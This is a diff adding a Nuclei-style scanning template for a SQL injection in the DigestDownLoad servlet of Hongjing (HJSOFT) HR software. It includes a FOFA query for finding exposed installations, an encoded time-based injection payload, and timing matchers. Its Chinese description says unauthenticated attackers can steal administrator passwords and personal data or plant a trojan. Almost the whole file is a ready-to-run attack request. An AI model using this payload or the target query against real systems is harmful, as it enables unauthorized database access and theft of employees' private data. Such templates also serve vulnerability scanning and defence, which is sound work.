@@ -1,0 +1,34 @@
+id: hongjing-hr-system-diggestdownload-sql-injection
+
+info:
+  name: "宏景人力资源管理系统DigestDownLoad接口SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="HJSOFT-HCM"
+    宏景人力资源管理系统（eHR）由宏景软件研发。其 DigestDownLoad 接口存在 SQL 注入漏洞，未授权攻击者可利用该漏洞获取数据库敏感信息（如管理员密码、用户隐私），或在高权限下向服务器写入木马以获取系统控制权。
+  tags: 宏景人力资源管理系统
+
+http:
+- raw:
+  - |
+    GET /servlet/DigestDownLoad?id=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  - |
+    GET /servlet/DigestDownLoad?id=SPAATTP~32HJFPAATTPJPAATTP~32HJFPAATTPHNvno~33W~39Sm~33WBgDEqPAATTP~32HJFPAATTPWzCGPAATTP~32HJBPAATTPS~30TBXpcPpPAATTP~32HJFPAATTP~37~39l~37h~38PAATTP~33HJDPAATTP HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+      - duration_1>=0 && duration_1<=2
+      - duration_2>=5 && duration_2<=7
+      condition: and
